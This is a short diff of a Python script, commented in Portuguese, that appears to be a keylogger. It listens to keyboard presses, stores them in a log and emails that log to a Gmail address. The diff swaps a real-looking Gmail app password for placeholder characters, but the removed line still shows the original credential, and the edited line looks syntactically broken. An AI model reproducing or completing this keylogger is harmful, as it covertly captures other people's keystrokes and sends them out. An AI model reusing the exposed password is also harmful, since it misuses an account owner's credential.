@@ -8,7 +8,7 @@ log = ""
 #CONFIGORAÇÃO DO E-MAIL
 EMAIL_ORIGEM = "wrfinfo@gmail.com"
 EMAIL_DESTINO = "wrfinfo@gmail.com"
-SENHA_EMAIL = "vdkv ozjb opac ptlo"
+SENHA_EMAIL = "xxxx xxxx xxxx xxxx" - # alteardo por segurança
 
 def enviar_email():
     global log
@@ -51,4 +51,5 @@ def on_press(key):
 with keyboard.Listener(on_press=on_press) as listener:
     enviar_email()
     listener.join()
+
 
